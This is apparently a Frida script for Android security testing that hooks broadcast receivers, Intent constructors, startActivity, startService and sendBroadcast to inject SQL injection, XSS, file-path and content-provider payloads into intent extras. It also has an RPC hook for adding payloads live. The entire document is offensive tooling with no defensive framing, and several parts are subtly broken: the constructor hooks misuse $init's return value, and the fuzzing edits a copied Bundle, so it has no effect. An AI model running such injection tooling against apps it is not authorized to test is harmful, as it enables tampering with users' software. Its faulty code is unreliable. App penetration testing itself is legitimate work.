Java.perform(function () {
    console.log("[*] Starting advanced Intent Exploitation and Fuzzing script...");

    // === Global Payloads and Attack Vectors ===
    var payloads = [
        "' OR '1'='1' -- ",   // SQL Injection
        "<script>alert('XSS')</script>", // XSS Injection
        "InjectedPayload123", // Arbitrary payload
        "file:///data/data/com.yourapp/files/exploit", // Local File Inclusion
        "content://settings/system/airplane_mode_on" // Content Provider Attack
    ];

    // === Helper Function to Inject Payloads into Intents ===
    function injectPayload(intent) {
        payloads.forEach(function (payload) {
            intent.putExtra("injected_key_" + Math.random().toString(36).substring(7), payload);
        });
        return intent;
    }

    // === Dynamic Intent Fuzzing ===
    function fuzzIntent(intent) {
        var extras = intent.getExtras();
        if (extras) {
            var keys = extras.keySet().toArray();
            keys.forEach(function (key) {
                payloads.forEach(function (payload) {
                    extras.putString(key, payload);
                    console.log("[*] Fuzzing " + key + " with payload: " + payload);
                });
            });
        }
    }

    // === Hook All BroadcastReceiver to Capture and Manipulate Intents ===
    try {
        var BroadcastReceiver = Java.use("android.content.BroadcastReceiver");

        BroadcastReceiver.onReceive.implementation = function (context, intent) {
            var action = intent.getAction();
            console.log("[*] Received broadcast with action: " + action);

            // Log incoming intent extras
            var extras = intent.getExtras();
            if (extras) {
                var keys = extras.keySet().toArray();
                for (var i = 0; i < keys.length; i++) {
                    console.log("[*] Intent Extra: " + keys[i] + " = " + extras.get(keys[i]));
                }
            }

            // Fuzz intent extras
            fuzzIntent(intent);

            // Inject additional payloads into the intent
            var modifiedIntent = injectPayload(intent);
            console.log("[*] Injected payloads into incoming Intent.");

            // Call the original onReceive method
            this.onReceive(context, modifiedIntent);
        };
    } catch (err) {
        console.log("[!] Error hooking BroadcastReceiver: " + err);
    }

    // === Hook All Context.sendBroadcast Calls for Outgoing Broadcasts ===
    try {
        var Context = Java.use("android.content.Context");

        Context.sendBroadcast.overload("android.content.Intent").implementation = function (intent) {
            var action = intent.getAction();
            console.log("[*] Outgoing broadcast with action: " + action);

            // Inject payloads into the outgoing Intent
            var modifiedIntent = injectPayload(intent);
            console.log("[*] Injected payloads into outgoing broadcast.");

            // Fuzz the intent before sending it
            fuzzIntent(modifiedIntent);

            return this.sendBroadcast(modifiedIntent);
        };
    } catch (err) {
        console.log("[!] Error hooking Context.sendBroadcast: " + err);
    }

    // === Hook Intent Constructor for Deep Intent Fuzzing ===
    try {
        var Intent = Java.use("android.content.Intent");

        Intent.$init.overload("java.lang.String").implementation = function (action) {
            console.log("[*] Creating new Intent with action: " + action);
            var newIntent = this.$init(action);

            // Inject payloads into the newly created Intent
            newIntent = injectPayload(newIntent);
            console.log("[*] Injected payloads into new Intent.");

            return newIntent;
        };

        Intent.$init.overload("java.lang.String", "android.net.Uri").implementation = function (action, uri) {
            console.log("[*] Creating new Intent with action: " + action + ", URI: " + uri);
            var newIntent = this.$init(action, uri);

            // Inject payloads into the newly created Intent
            newIntent = injectPayload(newIntent);
            console.log("[*] Injected payloads into new Intent with URI.");

            return newIntent;
        };
    } catch (err) {
        console.log("[!] Error hooking Intent constructor: " + err);
    }

    // === Hook startActivity for Intent-Based Navigation Exploitation ===
    try {
        var Activity = Java.use("android.app.Activity");

        Activity.startActivity.overload("android.content.Intent").implementation = function (intent) {
            var action = intent.getAction();
            console.log("[*] startActivity called with action: " + action);

            // Inject payloads and fuzz the Intent
            var modifiedIntent = injectPayload(intent);
            fuzzIntent(modifiedIntent);
            console.log("[*] Injected and fuzzed Intent for startActivity.");

            return this.startActivity(modifiedIntent);
        };
    } catch (err) {
        console.log("[!] Error hooking Activity.startActivity: " + err);
    }

    // === Hook startService for Service-Based Intent Exploitation ===
    try {
        Context.startService.overload("android.content.Intent").implementation = function (intent) {
            var action = intent.getAction();
            console.log("[*] startService called with action: " + action);

            // Inject payloads and fuzz the Intent
            var modifiedIntent = injectPayload(intent);
            fuzzIntent(modifiedIntent);
            console.log("[*] Injected and fuzzed Intent for startService.");

            return this.startService(modifiedIntent);
        };
    } catch (err) {
        console.log("[!] Error hooking Context.startService: " + err);
    }

    // === RPC Interface for Real-Time Payload Injection ===
    rpc.exports = {
        injectDynamicPayload: function (payload) {
            payloads.push(payload);
            console.log("[*] Added dynamic payload: " + payload);
        }
    };

    console.log("[*] Advanced Intent Exploitation and Fuzzing script loaded successfully.");
});